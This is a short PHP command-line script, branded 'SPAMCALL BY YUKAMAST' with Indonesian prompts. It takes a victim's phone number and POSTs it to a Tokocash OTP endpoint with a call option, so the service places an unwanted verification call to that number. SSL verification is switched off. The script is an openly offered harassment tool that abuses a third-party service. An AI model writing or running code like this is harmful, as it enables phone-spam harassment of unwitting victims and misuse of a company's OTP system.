<?php
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $eek = curl_exec($ch);
        curl_close($ch);
                echo $eek."\n";
}

echo "
==================================================
|               SPAMCALL BY YUKAMAST             |
|       INSTAGRAM => rizkiswee                   |
|       CONTOH PENGGUNAAN ==> 081287348765       |
|                                                |
|                                                |
|                 HAVE A NICE DAY:)              |
==================================================\n";
echo "MASUKKAN NOMER YANG INGIN DI SPAM\nNOMER => ";
$number = trim(fgets(STDIN));
$execute = send($number);
print $execute;
?>
